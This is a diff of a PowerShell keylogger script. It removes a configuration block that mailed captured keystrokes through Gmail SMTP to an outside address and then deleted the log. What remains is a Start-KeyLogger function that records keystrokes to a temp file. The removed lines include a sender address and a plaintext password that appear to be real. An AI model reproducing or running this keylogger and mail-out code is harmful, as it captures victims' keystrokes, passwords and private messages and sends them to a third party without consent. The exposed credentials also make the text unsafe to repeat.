@@ -1,20 +1,3 @@
-# Edit only this section!
-$TimesToRun = 2
-$RunTimeP = 1
-$From = "madman1237890026525@gmail.com"
-$Pass = "Madman009"
-$To = "Madroof001@gmail.com"
-$Subject = "Keylogger Results"
-$body = "Keylogger Results"
-$SMTPServer = "smtp.gmail.com"
-$SMTPPort = "587"
-$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-############################
-
-
-$TimeStart = Get-Date
-$TimeEnd = $timeStart.addminutes($RunTimeP)
-
 #requires -Version 2
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
 {
@@ -77,8 +60,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       }
 	  $TimeNow = Get-Date
     }
-	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
-	Remove-Item -Path $Path -force
+	
 	}
   }
   finally
